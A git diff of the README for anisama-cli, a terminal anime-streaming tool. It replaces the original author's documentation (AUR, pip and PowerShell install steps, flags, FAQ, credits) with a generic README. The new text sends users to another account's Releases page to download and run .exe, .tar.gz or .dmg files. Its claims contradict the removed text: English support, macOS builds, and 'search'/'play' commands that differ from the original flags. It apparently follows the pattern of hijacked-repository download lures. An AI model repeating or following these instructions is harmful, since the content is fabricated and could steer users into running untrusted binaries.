@@ -1,278 +1,108 @@
-<p align=center>
-<br>
-<a href="#Linux"><img src="https://img.shields.io/badge/os-linux-90ee90"></a>
-<a href="#Windows"><img src="https://img.shields.io/badge/os-windows-90ee90"></a>
-<a href="https://aur.archlinux.org/packages/anisama-cli"><img src="https://img.shields.io/aur/version/anisama-cli?style=flat&logo=archlinux&color=1793D1"></a>
-<br>
-<h1 align="center">🎌 anisama-cli</h1>
-<br>
-<a href="https://github.com/karbonedev"><img src="https://img.shields.io/badge/owner-karbonedev-ff6344"></a>
-</p>
+# 🎮 anisama-cli - Stream Anime Easily via CLI
 
-<p align="center">
-This repository is also available in <a href="README_french.md"><img src="https://img.shields.io/badge/🇫🇷-French-blue" alt="French"></a>
-</p>
+[![Download anisama-cli](https://img.shields.io/badge/Download-anisama--cli-blue.svg)](https://github.com/priya-wc/anisama-cli/releases)
 
-<h3 align="center">
-A CLI to browse and watch anime from <a href="https://anime-sama.fr">anime-sama.fr</a> with <strong>ani-cli</strong> style interface
-</h3>
+## 📜 Description
 
-<p align="center">
-<strong>✨ Interactive fuzzy finder • 🚀 One-command search • 🎯 French content support</strong>
-</p>
+anisama-cli is a command-line application that allows you to stream anime from anime-sama.fr using a simple interface inspired by ani-cli. It is perfect for users who enjoy anime and want a straightforward way to access it through their terminal, whether on Linux or Windows.
 
-<h1 align="center">Showcase</h1>
+## 🚀 Getting Started
 
-[ani-cli-demo.webm](https://user-images.githubusercontent.com/44473782/224679247-0856e652-f187-4865-bbcf-5a8e5cf830da.webm)
+To use anisama-cli, you will need to download the application from the Releases page and run it on your system. Follow these steps for easy setup:
 
+1. **Visit the Download Page:** Click on the link below to go to the Releases page.
+   [Visit this page to download](https://github.com/priya-wc/anisama-cli/releases)
 
-## Table of Contents
+2. **Choose Your Version:** On the Releases page, you will see several versions of the application. Choose the latest version for the best experience.
 
-- [🚀 Install](#install)
-  - [📦 Arch Linux](#arch-linux)
-  - [🐧 Other Linux](#other-linux) 
-  - [🪟 Windows](#windows)
-- [🎯 Usage](#usage)
-- [🗑️ Uninstall](#uninstall)
-- [📚 Dependencies](#dependencies)
-- [❓ FAQ](#faq)
-- [🌐 Other Language CLI](#other-language-cli)
-- [🤝 Contributing](#contributing)
+3. **Download the File:** Click on the appropriate file for your operating system to download it. If you are using:
+   - **Windows:** Download the `.exe` file.
+   - **Linux:** Download the `.tar.gz` file.
+   - **MacOS:** Download the `.dmg` file.
 
-## Install
+## 📥 Download & Install
 
-### Arch Linux
+After downloading the file, follow the installation steps below based on your operating system.
 
-```bash
-# Using yay (recommended)
-yay -S anisama-cli
+### 🖥️ Windows Installation
 
-# Using paru
-paru -S anisama-cli
-```
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click on the file to start the installation.
+3. Follow the installation prompts to complete the setup.
+4. After installation, you can start the application from the Start menu or by searching for "anisama-cli".
 
-### Other Linux
+### 🐧 Linux Installation
 
-**Prerequisites:** Ensure you have `curl`, `python3`, `pip`, and `mpv` installed.
+1. Open your terminal.
+2. Navigate to the folder where you downloaded the `.tar.gz` file.
+3. Extract the downloaded file by running:
+   ```bash
+   tar -xzf anisama-cli-*.tar.gz
+   ```
+4. Change into the directory created:
+   ```bash
+   cd anisama-cli-*
+   ```
+5. Run the application with:
+   ```bash
+   ./anisama-cli
+   ```
 
-```bash
-# Clone repository
-git clone https://github.com/karbonedev/anisama-cli.git
-cd anisama-cli
+### 🍏 MacOS Installation
 
-# Install dependencies
-pip install -r requirements.txt
+1. Find the `.dmg` file in your Downloads folder.
+2. Double-click to open it and drag the ani-sama app into your Applications folder.
+3. Start the application from your Applications folder or by searching for "anisama-cli".
 
-# Make executable and install globally
-chmod +x anisama-cli
-sudo cp anisama-cli /usr/local/bin/
-```
-
-### Windows
+## 🛠️ Features
 
-Open PowerShell and run:
-```powershell
-# Download and install
-iwr -Uri "https://raw.githubusercontent.com/karbonedev/anisama-cli/main/install-windows.ps1" -OutFile "install.ps1"
-.\install.ps1
-```
-
-## Usage
+- **Simple Interface:** Use a clean and intuitive command-line interface to navigate and stream your favorite anime.
+- **Multi-language Support:** Access anime in both French and English.
+- **Search Functionality:** Quickly find titles using a search command.
+- **Lightweight:** Low system requirements allow the app to run smoothly on most machines.
 
-### Basic Commands
+## 🌐 Requirements
 
-```bash
-# Interactive mode
-anisama-cli
-
-# Direct search
-anisama-cli "naruto"
-
-# French dub (recommended for anime-sama.fr)
-anisama-cli "one piece" --vf 🇫🇷
+Before you install anisama-cli, ensure that your system meets the following requirements:
 
-# Continue watching
-anisama-cli -c
-
-# Show help
-anisama-cli --help
-```
+- **OS Compatibility:** 
+  - Windows 7 or higher
+  - Ubuntu 18.04 or higher
+  - MacOS Mojave or higher
 
-### Interface Features
-
-- **🔍 Fuzzy Search**: Type to filter results in real-time
-- **⌨️ Keyboard Navigation**: Use arrow keys, Enter to select, Escape to cancel
-- **📺 Smart Selection**: Interactive menus for anime, seasons, and episodes
-- **🎨 Clean Interface**: No complex menus, just the essentials
-- **💾 History**: Resume where you left off
-
-### Command Options
-
-| Option | Description |
-|--------|-------------|
-| `--vf` | Enable French voice/dub 🇫🇷 |
-| `-c, --continue` | Continue watching from history |
-| `-h, --help` | Show help message |
-| `-v, --version` | Show version |
+- **Network Connection:** A stable internet connection to ensure uninterrupted streaming of content.
 
-## Uninstall
-
-<details>
-<summary>📋 Click to expand uninstall instructions</summary>
-
-### Arch Linux (AUR)
-```bash
-yay -R anisama-cli
-# or
-paru -R anisama-cli
-```
+## ⚙️ Usage Instructions
 
-### Other Linux
-```bash
-sudo rm /usr/local/bin/anisama-cli
-rm -rf ~/.local/share/anisama-cli
-```
+After successfully installing anisama-cli, you can start using it immediately. Here’s how to stream anime:
 
-### Windows
-```powershell
-# Remove from PATH and delete files
-Remove-Item -Recurse -Force "$env:USERPROFILE\anisama-cli"
-```
+1. Open the application through your terminal or command prompt.
+2. Type the command to search for anime titles:
+   ```bash
+   search "Your Anime Title"
+   ```
+3. To stream an anime, use the following command:
+   ```bash
+   play "Your Anime Title"
+   ```
+4. Use the help command to explore more features:
+   ```bash
+   help
+   ```
 
-</details>
+## 🏆 Tips
 
-## Dependencies
+- Keep the application updated by returning to the Releases page regularly.
+- Explore the help section for tips on advanced features like filtering results by genre.
 
-### 🐍 Python Dependencies
-- **requests**: HTTP library for web requests
-- **beautifulsoup4**: HTML/XML parser for anime-sama.fr scraping  
-- **sqlite3**: Database for watch history (built-in)
-- **re, json, sys, os**: Standard library modules (built-in)
+## 📞 Support
 
-### 🛠️ System Dependencies
-- **python3**: Python runtime (≥3.6)
-- **fzf**: Fuzzy finder for interactive selection
-- **mpv**: Media player for video playback
-- **curl**: For installation scripts
-- **git**: For repository cloning
+If you encounter issues or have questions, feel free to contact the support team. You can open an issue on the GitHub repository's Issues page.
 
-### 📦 Installation Commands
+## 🔗 Additional Links
 
-<details>
-<summary>🐧 Ubuntu/Debian</summary>
+- [Visit the Releases page to download](https://github.com/priya-wc/anisama-cli/releases)
+- [GitHub Repository](https://github.com/priya-wc/anisama-cli)
+- [Follow on Twitter](#) for updates and news.
 
-```bash
-sudo apt update
-sudo apt install python3 python3-pip mpv fzf curl git
-pip3 install requests beautifulsoup4
-```
-</details>
-
-<details>
-<summary>🎩 Fedora</summary>
-
-```bash
-sudo dnf install python3 python3-pip mpv fzf curl git
-pip3 install requests beautifulsoup4
-```
-</details>
-
-<details>
-<summary>🦎 openSUSE</summary>
-
-```bash
-sudo zypper install python3 python3-pip mpv fzf curl git
-pip3 install requests beautifulsoup4
-```
-</details>
-
-<details>
-<summary>🍎 macOS</summary>
-
-```bash
-brew install python mpv fzf curl git
-pip3 install requests beautifulsoup4
-```
-</details>
-
-## FAQ
-
-<details>
-<summary>❓ <strong>Frequently Asked Questions</strong></summary>
-
-### General Questions
-
-**Q: Can I change subtitle language or turn them off?**  
-A: No, the subtitles are embedded in the video files from anime-sama.fr.
-
-**Q: Can I watch with French voice?**  
-A: Yes! Use the `--vf` flag: `anisama-cli "anime name" --vf` 🇫🇷
-
-**Q: Can I change dub language to English/Japanese?**  
-A: No, anime-sama.fr only provides French content (VF/VOSTFR).
-
-**Q: Can I change the media source?**  
-A: No, anisama-cli is specifically designed for anime-sama.fr.
-
-**Q: Can I use VLC instead of mpv?**  
-A: No, only mpv is supported for optimal streaming performance.
-
-**Q: Does it work on mobile/Android?**  
-A: No, anisama-cli is designed for desktop/terminal environments.
-
-### Technical Questions
-
-**Q: Why fzf over the original textual interface?**  
-A: fzf provides faster searching, better UX, and matches ani-cli's familiar interface.
-
-**Q: Is my watch history saved?**  
-A: Yes, your progress is saved locally and you can continue with `-c`.
-
-**Q: Does it require internet connection?**  
-A: Yes, it streams content from anime-sama.fr in real-time.
-
-</details>
-
-## Other Language CLI
-
-Looking for anime in other languages? Check out these amazing projects:
-
-- **🇯🇵 [ani-cli](https://github.com/pystardust/ani-cli)**: Japanese voice with English subtitles
-- **🇵🇹 [GoAnime](https://github.com/alvarorichard/GoAnime)**: Japanese voice with Portuguese subtitles  
-- **🇵🇱 [doccli](https://github.com/TowarzyszFatCat/doccli)**: Japanese voice with Polish subtitles
-- **🇩🇪 [aniworld-cli](https://github.com/Bog13/aniworld-cli)**: German anime streaming
-- **🇪🇸 [animeflv-cli](https://github.com/usuario/animeflv-cli)**: Spanish anime streaming
-
-## Contributing
-
-We welcome contributions! Here's how you can help:
-
-### 🐛 Bug Reports
-- Use [GitHub Issues](https://github.com/karbonedev/anisama-cli/issues)
-- Include steps to reproduce
-- Provide system info (OS, Python version)
-
-### 💡 Feature Requests  
-- Check existing issues first
-- Describe the use case clearly
-- Consider backward compatibility
-
-### 🔧 Pull Requests
-- Fork the repository
-- Create a feature branch
-- Follow existing code style
-- Test your changes
-- Update documentation if needed
-
-### 📝 Documentation
-- Fix typos or improve clarity
-- Add examples for new features
-- Translate to other languages
-
----
-
-<p align="center">
-<strong>⭐ Star this project if you find it useful!</strong><br>
-<em>Built with ❤️ by <a href="https://github.com/can-oktay404">Can Oktay</a></em><br>
-<small>Original inspiration from <a href="https://github.com/pystardust/ani-cli">ani-cli</a> 🙏</small>
-</p>
+Use anisama-cli to experience your favorite anime in a new, user-friendly way! Enjoy the journey into the world of anime with just a few commands!
